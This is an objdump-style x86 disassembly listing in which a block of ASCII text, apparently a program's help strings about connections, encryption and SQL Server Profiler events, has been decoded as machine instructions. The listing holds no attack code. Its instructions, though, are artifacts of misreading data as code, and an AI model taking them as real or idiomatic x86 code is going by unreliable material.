  4045b0:	jno    0x404627
  4045b2:	gs jae 0x404629
  4045b5:	jae    0x4045d7
  4045b7:	je     0x404621
  4045b9:	popa   
  4045ba:	je     0x4045dc
  4045bc:	outs   dx,DWORD PTR ds:[esi]
  4045bd:	outs   dx,BYTE PTR ds:[esi]
  4045be:	ins    BYTE PTR es:[edi],dx
  4045bf:	jns    0x4045e1
  4045c1:	arpl   WORD PTR [edi+0x6e],bp
  4045c4:	imul   sp,WORD PTR [edi+0x75],0x6172
  4045ca:	je     0x404635
  4045cc:	outs   dx,DWORD PTR ds:[esi]
  4045cd:	outs   dx,BYTE PTR ds:[esi]
  4045ce:	jae    0x4045f0
  4045d0:	je     0x40463a
  4045d2:	popa   
  4045d3:	je     0x4045f5
  4045d5:	jne    0x40464a
  4045d7:	and    BYTE PTR gs:[eax+ebp*2+0x65],dh
  4045dc:	or     eax,0x909090a
  4045e1:	or     DWORD PTR [ebx+0x70],esi
  4045e4:	arpl   WORD PTR gs:[ecx+0x66],bp
  4045e8:	imul   esp,DWORD PTR [ebp+0x64],0x6e6f6320
  4045ef:	je     0x404663
  4045f1:	popa   
  4045f2:	arpl   WORD PTR [eax+eiz*1+0x62],si
  4045f6:	and    BYTE PTR gs:[ecx+0x6e],ah
  4045fa:	popa   
  4045fb:	ins    BYTE PTR es:[edi],dx
  4045fc:	jns    0x404678
  4045fe:	gs fs and BYTE PTR cs:[ecx+0x66],cl
  404604:	and    BYTE PTR [edi+0x4e],cl
  404607:	and    BYTE PTR [ebx+0x4f],al
  40460a:	dec    esi
  40460b:	push   esp
  40460c:	push   edx
  40460d:	inc    ecx
  40460e:	inc    ebx
  40460f:	push   esp
  404610:	or     eax,0x909090a
  404615:	or     DWORD PTR [ecx+0x73],ebp
  404618:	and    BYTE PTR [esi+0x6f],ch
  40461b:	je     0x40463d
  40461d:	jae    0x40468f
  40461f:	arpl   WORD PTR gs:[ecx+0x66],bp
  404623:	imul   esp,DWORD PTR [ebp+0x64],0x7373202c
  40462a:	bound  esp,QWORD PTR [ecx+ebp*2+0x61]
  40462e:	outs   dx,BYTE PTR ds:[si]
  404630:	outs   dx,DWORD PTR ds:[esi]
  404631:	jae    0x404698
  404633:	and    BYTE PTR [edx+0x65],dh
  404636:	jo     0x4046a7
  404638:	jb     0x4046ae
  40463a:	jae    0x40465c
  40463c:	outs   dx,DWORD PTR ds:[esi]
  40463d:	outs   dx,BYTE PTR ds:[esi]
  40463e:	and    BYTE PTR [eax+ebp*2+0x65],dh
  404642:	or     eax,0x909090a
  404647:	or     DWORD PTR [ebx+0x6f],esp
  40464a:	outs   dx,BYTE PTR ds:[esi]
  40464b:	je     0x4046bf
  40464d:	popa   
  40464e:	arpl   WORD PTR [eax+eiz*1+0x6e],si
  404652:	popa   
  404653:	ins    DWORD PTR es:[edi],dx
  404654:	gs and BYTE PTR fs:[ebp+eax*2+0x46],al
  40465a:	inc    ecx
  40465b:	push   ebp
  40465c:	dec    esp
  40465d:	push   esp
  40465e:	cs or  eax,0x450a0d0a
  404664:	dec    esi
  404665:	inc    ebx
  404666:	push   edx
  404667:	pop    ecx
  404668:	push   eax
  404669:	push   esp
  40466a:	dec    ecx
  40466b:	dec    edi
  40466c:	dec    esi
  40466d:	and    BYTE PTR [edi+0x4e],cl
  404670:	or     DWORD PTR [ecx],ecx
  404672:	or     DWORD PTR [edx+0x65],edx
  404675:	jno    0x4046ec
  404677:	gs jae 0x4046ee
  40467a:	jae    0x40469c
  40467c:	jbe    0x4046e3
  40467e:	jb     0x4046e9
  404680:	imul   sp,WORD PTR [ebx+0x61],0x6974
  404686:	outs   dx,DWORD PTR ds:[esi]
  404687:	outs   dx,BYTE PTR ds:[esi]
  404688:	and    BYTE PTR [eax+ebp*2+0x61],dh
  40468c:	je     0x4046ae
  40468e:	data16 jne 0x4046fd
  404691:	ins    BYTE PTR es:[edi],dx
  404692:	and    BYTE PTR [ecx+ebp*2+0x61],ah
  404696:	ins    BYTE PTR es:[edi],dx
  404697:	outs   dx,DWORD PTR ds:[esi]
  404698:	and    BYTE PTR [bp+di+0x65],dh
  40469c:	arpl   WORD PTR [ebp+0x72],si
  40469f:	imul   esi,DWORD PTR [ecx+edi*2+0xd],0x909090a
  4046a7:	or     DWORD PTR [ecx+0x73],ebp
  4046aa:	and    BYTE PTR [ebx+0x6f],ah
  4046ad:	outs   dx,BYTE PTR ds:[esi]
  4046ae:	imul   sp,WORD PTR [edi+0x75],0x6572
  4046b4:	and    BYTE PTR fs:[eax],ch
  4046b7:	fs gs popaw 
  4046bb:	jne    0x404729
  4046bd:	je     0x4046e8
  4046bf:	cs or  eax,0x2020200a
  4046c5:	and    BYTE PTR [eax],ah
  4046c7:	and    BYTE PTR [eax],ah
  4046c9:	and    BYTE PTR [eax],ah
  4046cb:	and    BYTE PTR [eax],ah
  4046cd:	dec    edi
  4046ce:	inc    esi
  4046cf:	inc    esi
  4046d0:	or     DWORD PTR [ecx],ecx
  4046d2:	or     DWORD PTR [edx+0x65],edx
  4046d5:	jno    0x40474c
  4046d7:	gs jae 0x40474e
  4046da:	jae    0x4046fc
  4046dc:	jbe    0x404743
  4046de:	jb     0x404749
  4046e0:	imul   sp,WORD PTR [ebx+0x61],0x6974
  4046e6:	outs   dx,DWORD PTR ds:[esi]
  4046e7:	outs   dx,BYTE PTR ds:[esi]
  4046e8:	and    BYTE PTR [eax+ebp*2+0x61],dh
  4046ec:	je     0x40470e
  4046ee:	outs   dx,BYTE PTR ds:[esi]
  4046ef:	outs   dx,DWORD PTR ds:[esi]
  4046f0:	and    BYTE PTR [ecx+ebp*2+0x61],ah
  4046f4:	ins    BYTE PTR es:[edi],dx
  4046f5:	outs   dx,DWORD PTR ds:[esi]
  4046f6:	and    BYTE PTR [bp+di+0x65],dh
  4046fa:	arpl   WORD PTR [ebp+0x72],si
  4046fd:	imul   esi,DWORD PTR [ecx+edi*2+0x20],0xa0d7369
  404705:	or     DWORD PTR [ecx],ecx
  404707:	or     DWORD PTR [ecx],ecx
  404709:	arpl   WORD PTR [edi+0x6e],bp
  40470c:	imul   sp,WORD PTR [edi+0x75],0x6572
  404712:	fs cs or eax,0x2020200a
  404719:	and    BYTE PTR [eax],ah
  40471b:	and    BYTE PTR [eax],ah
  40471d:	and    BYTE PTR [eax],ah
  40471f:	and    BYTE PTR [eax],ah
  404721:	inc    ecx
  404722:	dec    esi
  404723:	dec    edi
  404724:	dec    esi
  404725:	pop    ecx
  404726:	dec    ebp
  404727:	dec    edi
  404728:	push   ebp
  404729:	push   ebx
  40472a:	or     DWORD PTR [ecx],ecx
  40472c:	push   edx
  40472d:	gs jno 0x4047a5
  404730:	gs jae 0x4047a7
  404733:	jae    0x404755
  404735:	jbe    0x40479c
  404737:	jb     0x4047a2
  404739:	imul   sp,WORD PTR [ebx+0x61],0x6974
  40473f:	outs   dx,DWORD PTR ds:[esi]
  404740:	outs   dx,BYTE PTR ds:[esi]
  404741:	and    BYTE PTR [eax+ebp*2+0x61],dh
  404745:	je     0x404767
  404747:	popa   
  404748:	outs   dx,BYTE PTR ds:[esi]
  404749:	outs   dx,DWORD PTR ds:[esi]
  40474a:	outs   dx,BYTE PTR ds:[esi]
  40474b:	jns    0x4047ba
  40474d:	outs   dx,DWORD PTR ds:[esi]
  40474e:	jne    0x4047c3
  404750:	and    BYTE PTR [ecx+ebp*2+0x61],ah
  404754:	ins    BYTE PTR es:[edi],dx
  404755:	outs   dx,DWORD PTR ds:[esi]
  404756:	addr16 or eax,0x909090a
  40475c:	or     DWORD PTR [ebx+0x65],esi
  40475f:	arpl   WORD PTR [ebp+0x72],si
  404762:	imul   esi,DWORD PTR [ecx+edi*2+0x20],0x63207369
  40476a:	outs   dx,DWORD PTR ds:[esi]
  40476b:	outs   dx,BYTE PTR ds:[esi]
  40476c:	imul   sp,WORD PTR [edi+0x75],0x6572
  404772:	fs cs or eax,0x520a0d0a
  404779:	push   ebp
  40477a:	dec    esi
  40477b:	push   esp
  40477c:	dec    ecx
  40477d:	dec    ebp
  40477e:	inc    ebp
  40477f:	and    BYTE PTR [eax],ah
  404781:	and    BYTE PTR [eax],ah
  404783:	and    BYTE PTR [eax],ah
  404785:	and    BYTE PTR [eax],ah
  404787:	and    BYTE PTR [eax],ah
  404789:	and    BYTE PTR [eax],ah
  40478b:	and    BYTE PTR [eax],ah
  40478d:	and    BYTE PTR [eax],ah
  40478f:	and    BYTE PTR [eax],ah
  404791:	and    BYTE PTR [eax],ah
  404793:	and    BYTE PTR [eax],ah
  404795:	and    BYTE PTR [eax],ah
  404797:	and    BYTE PTR [edx+0x65],dl
  40479a:	jno    0x404811
  40479c:	gs jae 0x404813
  40479f:	jae    0x4047c1
  4047a1:	popa   
  4047a2:	and    BYTE PTR [edx+0x65],dh
  4047a5:	jo     0x404816
  4047a7:	jb     0x40481d
  4047a9:	and    BYTE PTR [edi+0x66],ch
  4047ac:	and    BYTE PTR [eax+ebp*2+0x65],dh
  4047b0:	and    BYTE PTR [ecx+0x73],ch
  4047b3:	jae    0x40482a
  4047b5:	gs jae 0x4047d8
  4047b8:	je     0x404822
  4047ba:	popa   
  4047bb:	je     0x4047dd
  4047bd:	popa   
  4047be:	jb     0x404825
  4047c0:	and    BYTE PTR [ebx+0x61],ah
  4047c3:	jne    0x404838
  4047c5:	imul   ebp,DWORD PTR [esi+0x67],0x20200a0d
  4047cc:	and    BYTE PTR [eax],ah
  4047ce:	and    BYTE PTR [eax],ah
  4047d0:	and    BYTE PTR [eax],ah
  4047d2:	and    BYTE PTR [eax],ah
  4047d4:	and    BYTE PTR [eax],ah
  4047d6:	and    BYTE PTR [eax],ah
  4047d8:	and    BYTE PTR [eax],ah
  4047da:	and    BYTE PTR [eax],ah
  4047dc:	and    BYTE PTR [eax],ah
  4047de:	and    BYTE PTR [eax],ah
  4047e0:	and    BYTE PTR [eax],ah
  4047e2:	and    BYTE PTR [eax],ah
  4047e4:	and    BYTE PTR [eax],ah
  4047e6:	and    BYTE PTR [eax],ah
  4047e8:	and    BYTE PTR [eax],ah
  4047ea:	jb     0x404861
  4047ec:	outs   dx,BYTE PTR ds:[esi]
  4047ed:	je     0x404858
  4047ef:	ins    DWORD PTR es:[edi],dx
  4047f0:	and    BYTE PTR gs:[ebp+0x72],ah
  4047f4:	jb     0x404865
  4047f6:	jb     0x40486b
  4047f8:	and    BYTE PTR [ecx+0x6e],ch
  4047fb:	and    BYTE PTR [ebx+0x65],dl
  4047fe:	jb     0x404876
  404800:	imul   esp,DWORD PTR [ebx+0x65],0x6f724220
  404807:	imul   esp,DWORD PTR [ebp+0x72],0x20
  40480b:	arpl   WORD PTR [edi+0x6e],bp
  40480e:	jbe    0x404875
  404810:	jb     0x404885
  404812:	popa   
  404813:	je     0x40487e
  404815:	outs   dx,DWORD PTR ds:[esi]
  404816:	outs   dx,BYTE PTR ds:[esi]
  404817:	jae    0x404847
  404819:	or     eax,0x2020200a
  40481e:	and    BYTE PTR [eax],ah
  404820:	and    BYTE PTR [eax],ah
  404822:	and    BYTE PTR [eax],ah
  404824:	and    BYTE PTR [eax],ah
  404826:	and    BYTE PTR [eax],ah
  404828:	and    BYTE PTR [eax],ah
  40482a:	and    BYTE PTR [eax],ah
  40482c:	and    BYTE PTR [eax],ah
  40482e:	and    BYTE PTR [eax],ah
  404830:	and    BYTE PTR [eax],ah
  404832:	and    BYTE PTR [eax],ah
  404834:	and    BYTE PTR [eax],ah
  404836:	and    BYTE PTR [eax],ah
  404838:	and    BYTE PTR [eax],ah
  40483a:	and    BYTE PTR [ecx+0x66],cl
  40483d:	and    BYTE PTR [esi+0x65],ch
  404840:	imul   esi,DWORD PTR [eax+ebp*2+0x65],0x4e2d2072
  404848:	inc    ebp
  404849:	push   edi
  40484a:	and    BYTE PTR [edi+0x72],ch
  40484d:	and    BYTE PTR ds:0x61204449,ch
  404853:	jb     0x4048ba
  404855:	and    BYTE PTR [ebx+0x70],dh
  404858:	arpl   WORD PTR gs:[ecx+0x66],bp
  40485c:	imul   esp,DWORD PTR [ebp+0x64],0x200a0d2c
  404863:	and    BYTE PTR [eax],ah
  404865:	and    BYTE PTR [eax],ah
  404867:	and    BYTE PTR [eax],ah
  404869:	and    BYTE PTR [eax],ah
  40486b:	and    BYTE PTR [eax],ah
  40486d:	and    BYTE PTR [eax],ah
  40486f:	and    BYTE PTR [eax],ah
  404871:	and    BYTE PTR [eax],ah
  404873:	and    BYTE PTR [eax],ah
  404875:	and    BYTE PTR [eax],ah
  404877:	and    BYTE PTR [eax],ah
  404879:	and    BYTE PTR [eax],ah
  40487b:	and    BYTE PTR [eax],ah
  40487d:	and    BYTE PTR [eax],ah
  40487f:	and    BYTE PTR [eax],ah
  404881:	and    BYTE PTR [ebx+0x73],dh
  404884:	bound  esp,QWORD PTR [ecx+ebp*2+0x61]
  404888:	outs   dx,BYTE PTR ds:[si]
  40488a:	outs   dx,DWORD PTR ds:[esi]
  40488b:	jae    0x4048f2
  40488d:	and    BYTE PTR [ebp+0x6f],ch
  404890:	outs   dx,BYTE PTR ds:[esi]
  404891:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6c612073
  404899:	ins    BYTE PTR es:[edi],dx
  40489a:	and    BYTE PTR [ebx+0x6f],ah
  40489d:	outs   dx,BYTE PTR ds:[esi]
  40489e:	jbe    0x404905
  4048a0:	jb     0x404915
  4048a2:	popa   
  4048a3:	je     0x40490e
  4048a5:	outs   dx,DWORD PTR ds:[esi]
  4048a6:	outs   dx,BYTE PTR ds:[esi]
  4048a7:	jae    0x4048c9
  4048a9:	imul   ebp,DWORD PTR [esi+0x20],0xd6c6c61
  4048b0:	or     ah,BYTE PTR [eax]
  4048b2:	and    BYTE PTR [eax],ah
  4048b4:	and    BYTE PTR [eax],ah
  4048b6:	and    BYTE PTR [eax],ah
  4048b8:	and    BYTE PTR [eax],ah
  4048ba:	and    BYTE PTR [eax],ah
  4048bc:	and    BYTE PTR [eax],ah
  4048be:	and    BYTE PTR [eax],ah
  4048c0:	and    BYTE PTR [eax],ah
  4048c2:	and    BYTE PTR [eax],ah
  4048c4:	and    BYTE PTR [eax],ah
  4048c6:	and    BYTE PTR [eax],ah
  4048c8:	and    BYTE PTR [eax],ah
  4048ca:	and    BYTE PTR [eax],ah
  4048cc:	and    BYTE PTR [eax],ah
  4048ce:	and    BYTE PTR [eax],ah
  4048d0:	and    BYTE PTR [ecx+eiz*2+0x74],ah
  4048d4:	popa   
  4048d5:	bound  esp,QWORD PTR [ecx+0x73]
  4048d8:	gs jae 0x4048fb
  4048db:	je     0x404945
  4048dd:	popa   
  4048de:	je     0x404900
  4048e0:	popa   
  4048e1:	jb     0x404948
  4048e3:	and    BYTE PTR [ebx+0x70],dh
  4048e6:	arpl   WORD PTR gs:[ecx+0x66],bp
  4048ea:	imul   esp,DWORD PTR [ebp+0x64],0x206e6920
  4048f1:	je     0x40495b
  4048f3:	and    BYTE PTR gs:[ebx+0x6f],ah
  4048f7:	outs   dx,BYTE PTR ds:[esi]
  4048f8:	outs   dx,BYTE PTR ds:[esi]
  4048f9:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4048fe:	outs   dx,BYTE PTR ds:[esi]
  4048ff:	or     eax,0x2020200a
  404904:	and    BYTE PTR [eax],ah
  404906:	and    BYTE PTR [eax],ah
  404908:	and    BYTE PTR [eax],ah
  40490a:	and    BYTE PTR [eax],ah
  40490c:	and    BYTE PTR [eax],ah
  40490e:	and    BYTE PTR [eax],ah
  404910:	and    BYTE PTR [eax],ah
  404912:	and    BYTE PTR [eax],ah
  404914:	and    BYTE PTR [eax],ah
  404916:	and    BYTE PTR [eax],ah
  404918:	and    BYTE PTR [eax],ah
  40491a:	and    BYTE PTR [eax],ah
  40491c:	and    BYTE PTR [eax],ah
  40491e:	and    BYTE PTR [eax],ah
  404920:	and    BYTE PTR [edi+0x70],ch
  404923:	je     0x40498e
  404925:	outs   dx,DWORD PTR ds:[esi]
  404926:	outs   dx,BYTE PTR ds:[esi]
  404927:	jae    0x404957
  404929:	and    BYTE PTR [eax+ebp*2+0x65],dl
  40492d:	and    BYTE PTR [ebx+0x73],dh
  404930:	bound  esp,QWORD PTR [ecx+ebp*2+0x61]
  404934:	outs   dx,BYTE PTR ds:[si]
  404936:	outs   dx,DWORD PTR ds:[esi]
  404937:	jae    0x40499e
  404939:	and    BYTE PTR [ebp+0x74],dh
  40493c:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6f6d2079
  404944:	outs   dx,BYTE PTR ds:[esi]
  404945:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x200a0d73
  40494d:	and    BYTE PTR [eax],ah
  40494f:	and    BYTE PTR [eax],ah
  404951:	and    BYTE PTR [eax],ah
  404953:	and    BYTE PTR [eax],ah
  404955:	and    BYTE PTR [eax],ah
  404957:	and    BYTE PTR [eax],ah
  404959:	and    BYTE PTR [eax],ah
  40495b:	and    BYTE PTR [eax],ah
  40495d:	and    BYTE PTR [eax],ah
  40495f:	and    BYTE PTR [eax],ah
  404961:	and    BYTE PTR [eax],ah
  404963:	and    BYTE PTR [eax],ah
  404965:	and    BYTE PTR [eax],ah
  404967:	and    BYTE PTR [eax],ah
  404969:	and    BYTE PTR [eax],ah
  40496b:	and    BYTE PTR [ebx+0x51],dl
  40496e:	dec    esp
  40496f:	and    BYTE PTR [ebx+0x65],dl
  404972:	jb     0x4049ea
  404974:	gs jb  0x404997
  404977:	push   eax
  404978:	jb     0x4049e9
  40497a:	imul   bp,WORD PTR [ebp+eiz*2+0x72],0x6520
  404981:	jbe    0x4049e8
  404983:	outs   dx,BYTE PTR ds:[esi]
  404984:	je     0x4049f9
  404986:	and    BYTE PTR [esi+0x6f],ah
  404989:	jb     0x4049ab
  40498b:	popa   
  40498c:	ins    BYTE PTR es:[edi],dx
  40498d:	ins    BYTE PTR es:[edi],dx
  40498e:	and    BYTE PTR [ebx+0x70],dh
  404991:	arpl   WORD PTR gs:[ecx+0x66],bp
  404995:	imul   esp,DWORD PTR [ebp+0x64],0x20200a0d
  40499c:	and    BYTE PTR [eax],ah
  40499e:	and    BYTE PTR [eax],ah
  4049a0:	and    BYTE PTR [eax],ah
  4049a2:	and    BYTE PTR [eax],ah
  4049a4:	and    BYTE PTR [eax],ah
  4049a6:	and    BYTE PTR [eax],ah
  4049a8:	and    BYTE PTR [eax],ah
  4049aa:	and    BYTE PTR [eax],ah
  4049ac:	and    BYTE PTR [eax],ah
  4049ae:	and    BYTE PTR [eax],ah
  4049b0:	and    BYTE PTR [eax],ah
  4049b2:	and    BYTE PTR [eax],ah
  4049b4:	and    BYTE PTR [eax],ah
  4049b6:	and    BYTE PTR [eax],ah
  4049b8:	and    BYTE PTR [eax],ah
  4049ba:	arpl   WORD PTR [edi+0x6e],bp
  4049bd:	jbe    0x404a24
  4049bf:	jb     0x404a34
  4049c1:	popa   
  4049c2:	je     0x404a2d
  4049c4:	outs   dx,DWORD PTR ds:[esi]
  4049c5:	outs   dx,BYTE PTR ds:[esi]
  4049c6:	jae    0x4049f6
  4049c8:	and    BYTE PTR [ecx+0x66],cl
  4049cb:	and    BYTE PTR [ebp+0x72],ah
  4049ce:	jb     0x404a3f
  4049d0:	jb     0x4049f2
  4049d2:	gs jbe 0x404a3a
  4049d5:	outs   dx,BYTE PTR ds:[esi]
  4049d6:	je     0x404a4b
  4049d8:	and    BYTE PTR [edi+0x63],ch
  4049db:	arpl   WORD PTR [ebp+0x72],si
  4049de:	sub    al,0x20
  4049e0:	or     eax,0x2020200a
  4049e5:	and    BYTE PTR [eax],ah
  4049e7:	and    BYTE PTR [eax],ah
  4049e9:	and    BYTE PTR [eax],ah
  4049eb:	and    BYTE PTR [eax],ah
  4049ed:	and    BYTE PTR [eax],ah
  4049ef:	and    BYTE PTR [eax],ah
  4049f1:	and    BYTE PTR [eax],ah
  4049f3:	and    BYTE PTR [eax],ah
  4049f5:	and    BYTE PTR [eax],ah
  4049f7:	and    BYTE PTR [eax],ah
  4049f9:	and    BYTE PTR [eax],ah
  4049fb:	and    BYTE PTR [eax],ah
  4049fd:	and    BYTE PTR [eax],ah
  4049ff:	and    BYTE PTR [eax],ah
  404a01:	and    BYTE PTR [ebx+0x73],dh
  404a04:	bound  esp,QWORD PTR [ecx+ebp*2+0x61]
  404a08:	outs   dx,BYTE PTR ds:[si]
  404a0a:	outs   dx,DWORD PTR ds:[esi]
  404a0b:	jae    0x404a72
  404a0d:	and    BYTE PTR [ecx+0x6e],ah
  404a10:	popa   
  404a11:	ins    BYTE PTR es:[edi],dx
  404a12:	jns    0x404a8e
  404a14:	gs jae 0x404a37
  404a17:	je     0x404a81
  404a19:	and    BYTE PTR gs:[ecx+0x73],ah
  404a1d:	jae    0x404a8e
  404a1f:	arpl   WORD PTR [ecx+0x61],bp
  404a22:	je     0x404a89
  404a24:	and    BYTE PTR fs:[ebx+0x6f],ah
  404a28:	outs   dx,BYTE PTR ds:[esi]
  404a29:	imul   sp,WORD PTR [edi+0x75],0x6172
  404a2f:	je     0x404a9a
  404a31:	outs   dx,DWORD PTR ds:[esi]
  404a32:	outs   dx,BYTE PTR ds:[esi]
  404a33:	or     eax,0x2020200a
  404a38:	and    BYTE PTR [eax],ah
  404a3a:	and    BYTE PTR [eax],ah
  404a3c:	and    BYTE PTR [eax],ah
  404a3e:	and    BYTE PTR [eax],ah
  404a40:	and    BYTE PTR [eax],ah
  404a42:	and    BYTE PTR [eax],ah
  404a44:	and    BYTE PTR [eax],ah
  404a46:	and    BYTE PTR [eax],ah
  404a48:	and    BYTE PTR [eax],ah
  404a4a:	and    BYTE PTR [eax],ah
  404a4c:	and    BYTE PTR [eax],ah
  404a4e:	and    BYTE PTR [eax],ah
  404a50:	and    BYTE PTR [eax],ah
  404a52:	and    BYTE PTR [eax],ah
  404a54:	and    BYTE PTR [esi+0x6f],ah
  404a57:	jb     0x404a79
  404a59:	gs jb  0x404ace
  404a5c:	outs   dx,DWORD PTR ds:[esi]
  404a5d:	jb     0x404ad2
  404a5f:	and    BYTE PTR cs:[edx+0x79],al
  404a63:	and    BYTE PTR [ebp+eiz*2+0x66],ah
  404a67:	popa   
  404a68:	jne    0x404ad6
  404a6a:	je     0x404a98
  404a6c:	and    BYTE PTR [ebp+0x72],ah
  404a6f:	jb     0x404ae0
  404a71:	jb     0x404a93
  404a73:	gs jbe 0x404adb
  404a76:	outs   dx,BYTE PTR ds:[esi]
  404a77:	je     0x404aec
  404a79:	and    BYTE PTR [ecx+0x72],ah
  404a7c:	and    BYTE PTR gs:[esi+0x6f],ch
  404a80:	je     0x404a8f
  404a82:	or     ah,BYTE PTR [eax]
  404a84:	and    BYTE PTR [eax],ah
  404a86:	and    BYTE PTR [eax],ah
  404a88:	and    BYTE PTR [eax],ah
  404a8a:	and    BYTE PTR [eax],ah
  404a8c:	and    BYTE PTR [eax],ah
  404a8e:	and    BYTE PTR [eax],ah
  404a90:	and    BYTE PTR [eax],ah
  404a92:	and    BYTE PTR [eax],ah
  404a94:	and    BYTE PTR [eax],ah
  404a96:	and    BYTE PTR [eax],ah
  404a98:	and    BYTE PTR [eax],ah
  404a9a:	and    BYTE PTR [eax],ah
  404a9c:	and    BYTE PTR [eax],ah
  404a9e:	and    BYTE PTR [eax],ah
  404aa0:	and    BYTE PTR [eax],ah
  404aa2:	and    BYTE PTR [edx+0x65],dh
  404aa5:	jo     0x404b16
  404aa7:	jb     0x404b1d
  404aa9:	gs fs and BYTE PTR cs:[edi+0x6e],cl
  404aaf:	ins    BYTE PTR es:[edi],dx
  404ab0:	jns    0x404ad2
  404ab2:	je     0x404b1c
  404ab4:	and    BYTE PTR gs:[edx+0x65],dh
  404ab8:	jae    0x404b2f
  404aba:	ins    BYTE PTR es:[edi],dx
  404abb:	je     0x404b30
  404abd:	and    BYTE PTR [edi+0x66],ch
  404ac0:	and    BYTE PTR [eax+ebp*2+0x65],dh
  404ac4:	and    BYTE PTR [ebx+0x6f],ah
  404ac7:	outs   dx,BYTE PTR ds:[esi]
  404ac8:	imul   sp,WORD PTR [edi+0x75],0x6172
  404ace:	je     0x404b39
  404ad0:	outs   dx,DWORD PTR ds:[esi]
  404ad1:	outs   dx,BYTE PTR ds:[esi]
  404ad2:	and    BYTE PTR ds:0x2020200a,cl
  404ad8:	and    BYTE PTR [eax],ah
  404ada:	and    BYTE PTR [eax],ah
  404adc:	and    BYTE PTR [eax],ah
  404ade:	and    BYTE PTR [eax],ah
  404ae0:	and    BYTE PTR [eax],ah
  404ae2:	and    BYTE PTR [eax],ah
  404ae4:	and    BYTE PTR [eax],ah
  404ae6:	and    BYTE PTR [eax],ah
  404ae8:	and    BYTE PTR [eax],ah
  404aea:	and    BYTE PTR [eax],ah
  404aec:	and    BYTE PTR [eax],ah
  404aee:	and    BYTE PTR [eax],ah
  404af0:	and    BYTE PTR [eax],ah
  404af2:	and    BYTE PTR [eax],ah
  404af4:	and    BYTE PTR [ebx+0x68],ah
  404af7:	arpl   WORD PTR gs:[ebx+0x20],bp
  404afb:	popa   
  404afc:	jb     0x404b63
  404afe:	and    BYTE PTR [edx+0x65],dh
  404b01:	jo     0x404b72
  404b03:	jb     0x404b79
  404b05:	gs fs and BYTE PTR cs:[ebx+0x70],dl
  404b0b:	arpl   WORD PTR gs:[ecx+0x66],bp
  404b0f:	jns    0x404b31
  404b11:	sub    eax,0x574f4853
  404b16:	inc    ebp
  404b17:	push   esi
  404b18:	inc    ebp
  404b19:	dec    esi
  404b1a:	push   esp
  404b1b:	push   ebx
  404b1c:	and    BYTE PTR [edi+ebp*2+0x20],dh
  404b20:	push   0xd657661
  404b25:	or     ah,BYTE PTR [eax]
  404b27:	and    BYTE PTR [eax],ah
  404b29:	and    BYTE PTR [eax],ah
  404b2b:	and    BYTE PTR [eax],ah
  404b2d:	and    BYTE PTR [eax],ah
  404b2f:	and    BYTE PTR [eax],ah
  404b31:	and    BYTE PTR [eax],ah
  404b33:	and    BYTE PTR [eax],ah
  404b35:	and    BYTE PTR [eax],ah
  404b37:	and    BYTE PTR [eax],ah
  404b39:	and    BYTE PTR [eax],ah
  404b3b:	and    BYTE PTR [eax],ah
  404b3d:	and    BYTE PTR [eax],ah
  404b3f:	and    BYTE PTR [eax],ah
  404b41:	and    BYTE PTR [eax],ah
  404b43:	and    BYTE PTR [eax],ah
  404b45:	and    BYTE PTR [eax+ebp*2+0x65],dh
  404b49:	and    BYTE PTR [ebp+0x72],ah
  404b4c:	jb     0x404bbd
  404b4e:	jb     0x404b70
  404b50:	gs jbe 0x404bb8
  404b53:	outs   dx,BYTE PTR ds:[esi]
  404b54:	je     0x404bc9
  404b56:	and    BYTE PTR [edx+0x65],dh
  404b59:	jo     0x404bca
  404b5b:	jb     0x404bd1
  404b5d:	gs fs cs or eax,0x2d0a0d0a
  404b65:	push   ebx
  404b66:	dec    eax
  404b67:	dec    edi
  404b68:	push   edi
  404b69:	inc    ebp
  404b6a:	push   esi
  404b6b:	inc    ebp
  404b6c:	dec    esi
  404b6d:	push   esp
  404b6e:	push   ebx
  404b6f:	and    BYTE PTR [eax],ah
  404b71:	and    BYTE PTR [eax],ah
  404b73:	and    BYTE PTR [eax],ah
  404b75:	and    BYTE PTR [eax],ah
  404b77:	and    BYTE PTR [eax],ah
  404b79:	and    BYTE PTR [eax],ah
  404b7b:	and    BYTE PTR [eax],ah
  404b7d:	and    BYTE PTR [eax],ah
  404b7f:	and    BYTE PTR [eax],ah
  404b81:	and    BYTE PTR [eax],ah
  404b83:	and    BYTE PTR [ebx+0x70],dl
  404b86:	arpl   WORD PTR gs:[ecx+0x66],bp
  404b8a:	imul   esp,DWORD PTR [ebp+0x73],0x61687420
  404b91:	je     0x404bb3
  404b93:	jae    0x404c08
  404b95:	bound  esp,QWORD PTR [ecx+ebp*2+0x61]
  404b99:	outs   dx,BYTE PTR ds:[si]
  404b9b:	outs   dx,DWORD PTR ds:[esi]
  404b9c:	jae    0x404c03
  404b9e:	and    BYTE PTR [edx+0x65],dh
  404ba1:	jo     0x404c12
  404ba3:	jb     0x404c19
  404ba5:	and    BYTE PTR [ebx+0x51],dl
  404ba8:	dec    esp
  404ba9:	and    BYTE PTR [ebx+0x65],dl
  404bac:	jb     0x404c24
  404bae:	gs jb  0x404bbe
  404bb1:	or     ah,BYTE PTR [eax]
  404bb3:	and    BYTE PTR [eax],ah
  404bb5:	and    BYTE PTR [eax],ah
  404bb7:	and    BYTE PTR [eax],ah
  404bb9:	and    BYTE PTR [eax],ah
  404bbb:	and    BYTE PTR [eax],ah
  404bbd:	and    BYTE PTR [eax],ah
  404bbf:	and    BYTE PTR [eax],ah
  404bc1:	and    BYTE PTR [eax],ah
  404bc3:	and    BYTE PTR [eax],ah
  404bc5:	and    BYTE PTR [eax],ah
  404bc7:	and    BYTE PTR [eax],ah
  404bc9:	and    BYTE PTR [eax],ah
  404bcb:	and    BYTE PTR [eax],ah
  404bcd:	and    BYTE PTR [eax],ah
  404bcf:	and    BYTE PTR [eax],ah
  404bd1:	and    BYTE PTR [eax+0x72],dl
  404bd4:	outs   dx,DWORD PTR ds:[esi]
  404bd5:	imul   bp,WORD PTR [ebp+eiz*2+0x72],0x6520
  404bdc:	jbe    0x404c43
  404bde:	outs   dx,BYTE PTR ds:[esi]
  404bdf:	je     0x404c54
  404be1:	and    BYTE PTR [ebp+esi*2+0x72],ah
  404be5:	imul   ebp,DWORD PTR [esi+0x67],0x52206120
  404bec:	push   ebp
  404bed:	dec    esi
  404bee:	push   esp
  404bef:	dec    ecx
  404bf0:	dec    ebp
  404bf1:	inc    ebp
  404bf2:	and    BYTE PTR [edx+0x65],dh
  404bf5:	jo     0x404c66
  404bf7:	jb     0x404c6d
